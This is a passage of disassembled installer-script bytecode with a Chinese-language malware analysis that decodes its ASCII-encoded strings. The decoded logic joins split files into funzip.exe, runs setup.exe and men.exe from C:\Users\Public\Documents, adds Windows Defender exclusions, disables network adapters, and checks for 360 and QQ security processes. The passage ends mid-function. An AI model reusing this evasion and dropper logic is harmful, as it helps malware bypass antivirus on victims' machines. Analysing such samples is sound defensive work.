	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(21)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(102)
	assign Var17[2], S32(117)
	assign Var17[3], S32(110)
	assign Var17[4], S32(122)
	assign Var17[5], S32(105)
	assign Var17[6], S32(112)
	assign Var17[7], S32(46)
	assign Var17[8], S32(101)
	assign Var17[9], S32(120)
	assign Var17[10], S32(101)
	assign Var17[11], S32(34)
	assign Var17[12], S32(32)
	assign Var17[13], S32(38)
	assign Var17[14], S32(38)
	assign Var17[15], S32(32)
	assign Var17[16], S32(100)
	assign Var17[17], S32(101)
	assign Var17[18], S32(108)
	assign Var17[19], S32(32)
	assign Var17[20], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(11)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(117)
	assign Var17[2], S32(110)
	assign Var17[3], S32(122)
	assign Var17[4], S32(105)
	assign Var17[5], S32(112)
	assign Var17[6], S32(46)
	assign Var17[7], S32(51)
	assign Var17[8], S32(34)
	assign Var17[9], S32(32)
	assign Var17[10], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(25)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(67)
	assign Var17[1], S32(58)
	assign Var17[2], S32(92)
	assign Var17[3], S32(85)
	assign Var17[4], S32(115)
	assign Var17[5], S32(101)
	assign Var17[6], S32(114)
	assign Var17[7], S32(115)
	assign Var17[8], S32(92)
	assign Var17[9], S32(80)
	assign Var17[10], S32(117)
	assign Var17[11], S32(98)
	assign Var17[12], S32(108)
	assign Var17[13], S32(105)
	assign Var17[14], S32(99)
	assign Var17[15], S32(92)
	assign Var17[16], S32(68)
	assign Var17[17], S32(111)
	assign Var17[18], S32(99)
	assign Var17[19], S32(117)
	assign Var17[20], S32(109)
	assign Var17[21], S32(101)
	assign Var17[22], S32(110)
	assign Var17[23], S32(116)
	assign Var17[24], S32(115)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	pushtype UnicodeString_2 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype Type30 ; StackCount = 17
	pushtype S32 ; StackCount = 18
	assign Var18, S32(9)
	pushvar Var17 ; StackCount = 19
	call SETARRAYLENGTH
	pop ; StackCount = 18
	pop ; StackCount = 17
	assign Var17[0], S32(92)
	assign Var17[1], S32(117)
	assign Var17[2], S32(110)
	assign Var17[3], S32(122)
	assign Var17[4], S32(105)
	assign Var17[5], S32(112)
	assign Var17[6], S32(46)
	assign Var17[7], S32(50)
	assign Var17[8], S32(34)
	assign Var16, Var17
	pop ; StackCount = 16
	pushvar Var15 ; StackCount = 17
	call STRFROMCODE
	pop ; StackCount = 16
	pop ; StackCount = 15
	add Var14, Var15
	pop ; StackCount = 14
	assign Var13, Var14
	pop ; StackCount = 13
	pushtype UnicodeString_2 ; StackCount = 14
	pushtype Type30 ; StackCount = 15
	pushtype Type30 ; StackCount = 16
	pushtype S32 ; StackCount = 17
	assign Var17, S32(7)
	pushvar Var16 ; StackCount = 18
	call SETARRAYLENGTH
	pop ; StackCount = 17
	pop ; StackCount = 16
	assign Var16[0], S32(99)
	assign Var16[1], S32(109)
	assign Var16[2], S32(100)
	assign Var16[3], S32(46)
	assign Var16[4], S32(101)
	assign Var16[5], S32(120)
	assign Var16[6], S32(101)
	assign Var15, Var16
	pop ; StackCount = 15
	pushvar Var14 ; StackCount = 16
	call STRFROMCODE
	pop ; StackCount = 15
	pop ; StackCount = 14
	pushvar Var8 ; StackCount = 15
	call EXEC
	pop ; StackCount = 14
	pop ; StackCount = 13
	pop ; StackCount = 12
	pop ; StackCount = 11
	pop ; StackCount = 10
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
	call OBFUSCATEDEXTRACT
	pushtype Type30 ; StackCount = 8
	pushtype Type30 ; StackCount = 9
	pushtype S32 ; StackCount = 10
	assign Var10, S32(51)
	pushvar Var9 ; StackCount = 11
	call SETARRAYLENGTH
	pop ; StackCount = 10
	pop ; StackCount = 9
	assign Var9[0], S32(67)
	assign Var9[1], S32(58)
	assign Var9[2], S32(92)
	assign Var9[3], S32(85)
	assign Var9[4], S32(115)
	assign Var9[5], S32(101)
	assign Var9[6], S32(114)
	assign Var9[7], S32(115)
	assign Var9[8], S32(92)
	assign Var9[9], S32(80)
	assign Var9[10], S32(117)
	assign Var9[11], S32(98)
	assign Var9[12], S32(108)
	assign Var9[13], S32(105)
	assign Var9[14], S32(99)
	assign Var9[15], S32(92)
	assign Var9[16], S32(68)
	assign Var9[17], S32(111)
	assign Var9[18], S32(99)
	assign Var9[19], S32(117)
	assign Var9[20], S32(109)
	assign Var9[21], S32(101)
	assign Var9[22], S32(110)
	assign Var9[23], S32(116)
	assign Var9[24], S32(115)
	assign Var9[25], S32(92)
	assign Var9[26], S32(120)
	assign Var9[27], S32(56)
	assign Var9[28], S32(54)
	assign Var9[29], S32(45)
	assign Var9[30], S32(77)
	assign Var9[31], S32(105)
	assign Var9[32], S32(99)
	assign Var9[33], S32(114)
	assign Var9[34], S32(111)
	assign Var9[35], S32(115)
	assign Var9[36], S32(111)
	assign Var9[37], S32(102)
	assign Var9[38], S32(116)
	assign Var9[39], S32(45)
	assign Var9[40], S32(87)
	assign Var9[41], S32(105)
	assign Var9[42], S32(110)
	assign Var9[43], S32(100)
	assign Var9[44], S32(111)
	assign Var9[45], S32(119)
	assign Var9[46], S32(115)
	assign Var9[47], S32(100)
	assign Var9[48], S32(97)
	assign Var9[49], S32(116)
	assign Var9[50], S32(97)
	assign Var8, Var9
	pop ; StackCount = 8
	pushvar Var2 ; StackCount = 9
	call STRFROMCODE
	pop ; StackCount = 8
	pop ; StackCount = 7
	pushtype Type30 ; StackCount = 8
	pushtype Type30 ; StackCount = 9
	pushtype S32 ; StackCount = 10
	assign Var10, S32(36)
	pushvar Var9 ; StackCount = 11
	call SETARRAYLENGTH
	pop ; StackCount = 10
	pop ; StackCount = 9
	assign Var9[0], S32(67)
	assign Var9[1], S32(58)
	assign Var9[2], S32(92)
	assign Var9[3], S32(85)
	assign Var9[4], S32(115)
	assign Var9[5], S32(101)
	assign Var9[6], S32(114)
	assign Var9[7], S32(115)
	assign Var9[8], S32(92)
	assign Var9[9], S32(80)
	assign Var9[10], S32(117)
	assign Var9[11], S32(98)
	assign Var9[12], S32(108)
	assign Var9[13], S32(105)
	assign Var9[14], S32(99)
	assign Var9[15], S32(92)
	assign Var9[16], S32(68)
	assign Var9[17], S32(111)
	assign Var9[18], S32(99)
	assign Var9[19], S32(117)
	assign Var9[20], S32(109)
	assign Var9[21], S32(101)
	assign Var9[22], S32(110)
	assign Var9[23], S32(116)
	assign Var9[24], S32(115)
	assign Var9[25], S32(92)
	assign Var9[26], S32(83)
	assign Var9[27], S32(101)
	assign Var9[28], S32(114)
	assign Var9[29], S32(118)
	assign Var9[30], S32(101)
	assign Var9[31], S32(114)
	assign Var9[32], S32(46)
	assign Var9[33], S32(108)
	assign Var9[34], S32(111)
	assign Var9[35], S32(103)
	assign Var8, Var9
	pop ; StackCount = 8
	pushvar Var3 ; StackCount = 9
	call STRFROMCODE
	pop ; StackCount = 8
	pop ; StackCount = 7
	pushtype WideString ; StackCount = 8
	assign Var8, Var2
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(11)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(92)
	assign Var11[1], S32(83)
	assign Var11[2], S32(101)
	assign Var11[3], S32(114)
	assign Var11[4], S32(118)
	assign Var11[5], S32(101)
	assign Var11[6], S32(114)
	assign Var11[7], S32(46)
	assign Var11[8], S32(108)
	assign Var11[9], S32(111)
	assign Var11[10], S32(103)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	add Var8, Var9
	pop ; StackCount = 8
	assign Var4, Var8
	pop ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var2
	pushvar Var8 ; StackCount = 10
	call FORCEDIRECTORIES
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var3
	pushvar Var8 ; StackCount = 10
	call FILEEXISTS
	pop ; StackCount = 9
	pop ; StackCount = 8
	sfz Var8
	pop ; StackCount = 7
	jf loc_435a
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var4
	pushvar Var8 ; StackCount = 10
	call FILEEXISTS
	pop ; StackCount = 9
	pop ; StackCount = 8
	sfz Var8
	pop ; StackCount = 7
	jf loc_4326
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var4
	pushvar Var8 ; StackCount = 10
	call DELETEFILE
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
loc_4326:
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var4
	pushtype UnicodeString_2 ; StackCount = 10
	assign Var10, Var3
	pushvar Var8 ; StackCount = 11
	call RENAMEFILE
	pop ; StackCount = 10
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
loc_435a:
	pushtype WideString ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(26)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(67)
	assign Var11[1], S32(58)
	assign Var11[2], S32(92)
	assign Var11[3], S32(85)
	assign Var11[4], S32(115)
	assign Var11[5], S32(101)
	assign Var11[6], S32(114)
	assign Var11[7], S32(115)
	assign Var11[8], S32(92)
	assign Var11[9], S32(80)
	assign Var11[10], S32(117)
	assign Var11[11], S32(98)
	assign Var11[12], S32(108)
	assign Var11[13], S32(105)
	assign Var11[14], S32(99)
	assign Var11[15], S32(92)
	assign Var11[16], S32(68)
	assign Var11[17], S32(111)
	assign Var11[18], S32(99)
	assign Var11[19], S32(117)
	assign Var11[20], S32(109)
	assign Var11[21], S32(101)
	assign Var11[22], S32(110)
	assign Var11[23], S32(116)
	assign Var11[24], S32(115)
	assign Var11[25], S32(92)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	assign Var8, Var9
	pop ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(9)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(115)
	assign Var11[1], S32(101)
	assign Var11[2], S32(116)
	assign Var11[3], S32(117)
	assign Var11[4], S32(112)
	assign Var11[5], S32(46)
	assign Var11[6], S32(101)
	assign Var11[7], S32(120)
	assign Var11[8], S32(101)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	add Var8, Var9
	pop ; StackCount = 8
	assign Var6, Var8
	pop ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var6
	pushvar Var8 ; StackCount = 10
	call FILEEXISTS
	pop ; StackCount = 9
	pop ; StackCount = 8
	sfz Var8
	pop ; StackCount = 7
	jf loc_47cd
	pushtype BOOLEAN ; StackCount = 8
	pushtype Pointer ; StackCount = 9
	setptr Var9, Var7
	pushtype U8_4 ; StackCount = 10
	assign Var10, U8_4(0)
	pushtype S32 ; StackCount = 11
	assign Var11, S32(5)
	pushtype UnicodeString_2 ; StackCount = 12
	pushtype Type30 ; StackCount = 13
	pushtype Type30 ; StackCount = 14
	pushtype S32 ; StackCount = 15
	assign Var15, S32(0)
	pushvar Var14 ; StackCount = 16
	call SETARRAYLENGTH
	pop ; StackCount = 15
	pop ; StackCount = 14
	assign Var13, Var14
	pop ; StackCount = 13
	pushvar Var12 ; StackCount = 14
	call STRFROMCODE
	pop ; StackCount = 13
	pop ; StackCount = 12
	pushtype UnicodeString_2 ; StackCount = 13
	pushtype Type30 ; StackCount = 14
	pushtype Type30 ; StackCount = 15
	pushtype S32 ; StackCount = 16
	assign Var16, S32(0)
	pushvar Var15 ; StackCount = 17
	call SETARRAYLENGTH
	pop ; StackCount = 16
	pop ; StackCount = 15
	assign Var14, Var15
	pop ; StackCount = 14
	pushvar Var13 ; StackCount = 15
	call STRFROMCODE
	pop ; StackCount = 14
	pop ; StackCount = 13
	pushtype UnicodeString_2 ; StackCount = 14
	assign Var14, Var6
	pushvar Var8 ; StackCount = 15
	call EXEC
	pop ; StackCount = 14
	pop ; StackCount = 13
	pop ; StackCount = 12
	pop ; StackCount = 11
	pop ; StackCount = 10
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
loc_47cd:
	pushtype WideString ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(25)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(67)
	assign Var11[1], S32(58)
	assign Var11[2], S32(92)
	assign Var11[3], S32(85)
	assign Var11[4], S32(115)
	assign Var11[5], S32(101)
	assign Var11[6], S32(114)
	assign Var11[7], S32(115)
	assign Var11[8], S32(92)
	assign Var11[9], S32(80)
	assign Var11[10], S32(117)
	assign Var11[11], S32(98)
	assign Var11[12], S32(108)
	assign Var11[13], S32(105)
	assign Var11[14], S32(99)
	assign Var11[15], S32(92)
	assign Var11[16], S32(68)
	assign Var11[17], S32(111)
	assign Var11[18], S32(99)
	assign Var11[19], S32(117)
	assign Var11[20], S32(109)
	assign Var11[21], S32(101)
	assign Var11[22], S32(110)
	assign Var11[23], S32(116)
	assign Var11[24], S32(115)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	assign Var8, Var9
	pop ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	pushtype Type30 ; StackCount = 10
	pushtype Type30 ; StackCount = 11
	pushtype S32 ; StackCount = 12
	assign Var12, S32(8)
	pushvar Var11 ; StackCount = 13
	call SETARRAYLENGTH
	pop ; StackCount = 12
	pop ; StackCount = 11
	assign Var11[0], S32(92)
	assign Var11[1], S32(109)
	assign Var11[2], S32(101)
	assign Var11[3], S32(110)
	assign Var11[4], S32(46)
	assign Var11[5], S32(101)
	assign Var11[6], S32(120)
	assign Var11[7], S32(101)
	assign Var10, Var11
	pop ; StackCount = 10
	pushvar Var9 ; StackCount = 11
	call STRFROMCODE
	pop ; StackCount = 10
	pop ; StackCount = 9
	add Var8, Var9
	pop ; StackCount = 8
	assign Var5, Var8
	pop ; StackCount = 7
	pushtype BOOLEAN ; StackCount = 8
	pushtype UnicodeString_2 ; StackCount = 9
	assign Var9, Var5
	pushvar Var8 ; StackCount = 10
	call FILEEXISTS
	pop ; StackCount = 9
	pop ; StackCount = 8
	sfz Var8
	pop ; StackCount = 7
	jf loc_4c1a
	pushtype BOOLEAN ; StackCount = 8
	pushtype Pointer ; StackCount = 9
	setptr Var9, Var7
	pushtype U8_4 ; StackCount = 10
	assign Var10, U8_4(0)
	pushtype S32 ; StackCount = 11
	assign Var11, S32(0)
	pushtype UnicodeString_2 ; StackCount = 12
	pushtype Type30 ; StackCount = 13
	pushtype Type30 ; StackCount = 14
	pushtype S32 ; StackCount = 15
	assign Var15, S32(0)
	pushvar Var14 ; StackCount = 16
	call SETARRAYLENGTH
	pop ; StackCount = 15
	pop ; StackCount = 14
	assign Var13, Var14
	pop ; StackCount = 13
	pushvar Var12 ; StackCount = 14
	call STRFROMCODE
	pop ; StackCount = 13
	pop ; StackCount = 12
	pushtype UnicodeString_2 ; StackCount = 13
	pushtype Type30 ; StackCount = 14
	pushtype Type30 ; StackCount = 15
	pushtype S32 ; StackCount = 16
	assign Var16, S32(0)
	pushvar Var15 ; StackCount = 17
	call SETARRAYLENGTH
	pop ; StackCount = 16
	pop ; StackCount = 15
	assign Var14, Var15
	pop ; StackCount = 14
	pushvar Var13 ; StackCount = 15
	call STRFROMCODE
	pop ; StackCount = 14
	pop ; StackCount = 13
	pushtype UnicodeString_2 ; StackCount = 14
	assign Var14, Var5
	pushvar Var8 ; StackCount = 15
	call EXEC
	pop ; StackCount = 14
	pop ; StackCount = 13
	pop ; StackCount = 12
	pop ; StackCount = 11
	pop ; StackCount = 10
	pop ; StackCount = 9
	pop ; StackCount = 8
	pop ; StackCount = 7
loc_4c1a:
	ret
```
这个函数包含多个ASCII码数组，用于构建字符串并执行各种操作。

以下是所有数组的ASCII码还原结果及其对应的字符串：

1. 第一个数组（12字节）
ASCII码：47, 99, 32, 99, 111, 112, 121, 32, 47, 98, 32, 34
字符串："/c copy /b \""

2. 第二个数组（25字节）
ASCII码：67, 58, 92, 85, 115, 101, 114, 115, 92, 80, 117, 98, 108, 105, 99, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115
字符串："C:\Users\Public\Documents"

3. 第三个数组（13字节）
ASCII码：92, 117, 110, 122, 105, 112, 46, 51, 34, 32, 43, 32, 34
字符串："\unzip.3\" + \""

4. 第四个数组（11字节）
ASCII码：92, 117, 110, 122, 105, 112, 46, 50, 34, 32, 34
字符串："\unzip.2\" \""

5. 第五个数组（21字节）
ASCII码：92, 102, 117, 110, 122, 105, 112, 46, 101, 120, 101, 34, 32, 38, 38, 32, 100, 101, 108, 32, 34
字符串："\funzip.exe\" && del \""

6. 第六个数组（9字节）
ASCII码：92, 117, 110, 122, 105, 112, 46, 50, 34
字符串："\unzip.2\""

7. 第七个数组（7字节）
ASCII码：99, 109, 100, 46, 101, 120, 101
字符串："cmd.exe"

8. 第八个数组（51字节）
ASCII码：67, 58, 92, 85, 115, 101, 114, 115, 92, 80, 117, 98, 108, 105, 99, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115, 92, 120, 56, 54, 45, 77, 105, 99, 114, 111, 115, 111, 102, 116, 45, 87, 105, 110, 100, 111, 119, 115, 100, 97, 116, 97
字符串："C:\Users\Public\Documents\x86-Microsoft-Windowsdata"

9. 第九个数组（36字节）
ASCII码：67, 58, 92, 85, 115, 101, 114, 115, 92, 80, 117, 98, 108, 105, 99, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115, 92, 83, 101, 114, 118, 101, 114, 46, 108, 111, 103
字符串："C:\Users\Public\Documents\Server.log"

10. 第十个数组（11字节）
ASCII码：92, 83, 101, 114, 118, 101, 114, 46, 108, 111, 103
字符串："\Server.log"

11. 第十一个数组（26字节）
ASCII码：67, 58, 92, 85, 115, 101, 114, 115, 92, 80, 117, 98, 108, 105, 99, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115, 92
字符串："C:\Users\Public\Documents\"

12. 第十二个数组（9字节）
ASCII码：115, 101, 116, 117, 112, 46, 101, 120, 101
字符串："setup.exe"

13. 第十三个数组（8字节）
ASCII码：92, 109, 101, 110, 46, 101, 120, 101
字符串："\men.exe"

该函数执行以下功能：
1. 执行cmd.exe /c copy /b /y，将C:\Users\Public\Documents\unzip.3和unzip.2合并为funzip.exe
2. 删除unzip.3和unzip.2文件
3. 调用ADDDEFENDEREXCLUSION、OBFUSCATEDEXTRACT等函数（如果360Tray.exe进程存在则会先调用ADDDEFENDEREXCLUSION和DISABLENETWORKADAPTERS执行断网操作）
4. 使用C:\Users\Public\Documents作为工作目录，创建x86-Microsoft-Windowsdata子目录，即创建C:\Users\Public\Documents\x86-Microsoft-Windowsdata目录
5. 使用EXEC函数执行setup.exe、men.exe等文件，即使用EXEC函数执行C:\Users\Public\Documents\setup.exe和C:\Users\Public\Documents\men.exe等文件

该函数会检测360主防进程——若存在，则执行断网，具体如下：
该函数会调用代码中的“IS360PROCESSRUNNING”函数判断360主防进程"360Tray.exe"是否存在，从而执行不同的逻辑。
检查360进程是否运行：
```
; 第8-14行代码
pushtype BOOLEAN ; StackCount = 8
pushvar Var8 ; StackCount = 9
call INITIALIZESETUP ; 初始化设置
pop ; StackCount = 8
pop ; StackCount = 7
pushvar Var1 ; StackCount = 8
call IS360PROCESSRUNNING ; 检查360安全卫士进程是否正在运行
pop ; StackCount = 7
```
检查结果和条件跳转：
```
; 第15-22行代码
pushtype BOOLEAN ; StackCount = 8
assign Var8, Var1 ; 检查函数"IS360PROCESSRUNNING"的返回值（存储在Var1中）赋给变量Var8，用于后续判断
setz Var8 ; 检查Var8的值是否为假（0）
sfz Var8 ; 根据sfz指令的判断结果，如果Var8为假（即360进程没有运行），则跳转到标签loc_263f处执行
pop ; StackCount = 7
jf loc_263f
```

执行路径：
如果360进程在运行：继续执行当前代码块（从第23行开始），然后调用"ADDDEFENDEREXCLUSION"（添加Windows Defender排除项）和"OBFUSCATEDEXTRACT"
如果360进程不在运行：跳转到loc_263f标签处执行，那里会先调用"ADDDEFENDEREXCLUSION"（添加Windows Defender排除项）和"DISABLENETWORKADAPTERS"（断网）


我们来看一下"IS360PROCESSRUNNING"函数：
```
.function(export) BOOLEAN IS360PROCESSRUNNING()
        pushtype Variant ; StackCount = 1
        pushtype Variant ; StackCount = 2
        pushtype Variant ; StackCount = 3
        pushtype UnicodeString_2 ; StackCount = 4
        pushtype UnicodeString_2 ; StackCount = 5
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype UnicodeString_2 ; StackCount = 7
        assign RetVal, BOOLEAN(0)
        starteh null, loc_8a1, null, loc_8af
        pushtype IDISPATCH ; StackCount = 8
        pushtype UnicodeString_2 ; StackCount = 9
        pushtype Type30 ; StackCount = 10
        pushtype Type30 ; StackCount = 11
        pushtype S32 ; StackCount = 12
        assign Var12, S32(26)
        pushvar Var11 ; StackCount = 13
        call SETARRAYLENGTH
        pop ; StackCount = 12
        pop ; StackCount = 11
        assign Var11[0], S32(87)
        assign Var11[1], S32(66)
        assign Var11[2], S32(69)
        assign Var11[3], S32(77)
        assign Var11[4], S32(83)
        assign Var11[5], S32(99)
        assign Var11[6], S32(114)
        assign Var11[7], S32(105)
        assign Var11[8], S32(112)
        assign Var11[9], S32(116)
        assign Var11[10], S32(105)
        assign Var11[11], S32(110)
        assign Var11[12], S32(103)
        assign Var11[13], S32(46)
        assign Var11[14], S32(83)
        assign Var11[15], S32(87)
        assign Var11[16], S32(66)
        assign Var11[17], S32(69)
        assign Var11[18], S32(77)
        assign Var11[19], S32(76)
        assign Var11[20], S32(111)
        assign Var11[21], S32(99)
        assign Var11[22], S32(97)
        assign Var11[23], S32(116)
        assign Var11[24], S32(111)
        assign Var11[25], S32(114)
        assign Var10, Var11
        pop ; StackCount = 10
        pushvar Var9 ; StackCount = 11
        call STRFROMCODE
        pop ; StackCount = 10
        pop ; StackCount = 9
        pushvar Var8 ; StackCount = 10
        call CREATEOLEOBJECT
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var1, Var8
        pop ; StackCount = 7
        pushtype !OPENARRAYOFVARIANT ; StackCount = 8
        pushtype !OPENARRAYOFVARIANT ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(2)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], String_3("")
        assign Var9[1], String_3("root\\cimv2")
        assign Var8, Var9
        pop ; StackCount = 8
        pushtype String_3 ; StackCount = 9
        assign Var9, String_3("ConnectServer")
        pushtype BOOLEAN ; StackCount = 10
        assign Var10, BOOLEAN(0)
        pushtype IDISPATCH ; StackCount = 11
        assign Var11, Var1
        pushvar Var2 ; StackCount = 12
        call IDISPATCHINVOKE
        pop ; StackCount = 11
        pop ; StackCount = 10
        pop ; StackCount = 9
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype Type30 ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(11)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], S32(51)
        assign Var9[1], S32(54)
        assign Var9[2], S32(48)
        assign Var9[3], S32(116)
        assign Var9[4], S32(114)
        assign Var9[5], S32(97)
        assign Var9[6], S32(121)
        assign Var9[7], S32(46)
        assign Var9[8], S32(101)
        assign Var9[9], S32(120)
        assign Var9[10], S32(101)
        assign Var8, Var9
        pop ; StackCount = 8
        pushvar Var5 ; StackCount = 9
        call STRFROMCODE
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype Type30 ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(11)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], S32(51)
        assign Var9[1], S32(54)
        assign Var9[2], S32(48)
        assign Var9[3], S32(84)
        assign Var9[4], S32(114)
        assign Var9[5], S32(97)
        assign Var9[6], S32(121)
        assign Var9[7], S32(46)
        assign Var9[8], S32(101)
        assign Var9[9], S32(120)
        assign Var9[10], S32(101)
        assign Var8, Var9
        pop ; StackCount = 8
        pushvar Var6 ; StackCount = 9
        call STRFROMCODE
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype Type30 ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(12)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], S32(81)
        assign Var9[1], S32(81)
        assign Var9[2], S32(80)
        assign Var9[3], S32(67)
        assign Var9[4], S32(84)
        assign Var9[5], S32(114)
        assign Var9[6], S32(97)
        assign Var9[7], S32(121)
        assign Var9[8], S32(46)
        assign Var9[9], S32(101)
        assign Var9[10], S32(120)
        assign Var9[11], S32(101)
        assign Var8, Var9
        pop ; StackCount = 8
        pushvar Var7 ; StackCount = 9
        call STRFROMCODE
        pop ; StackCount = 8
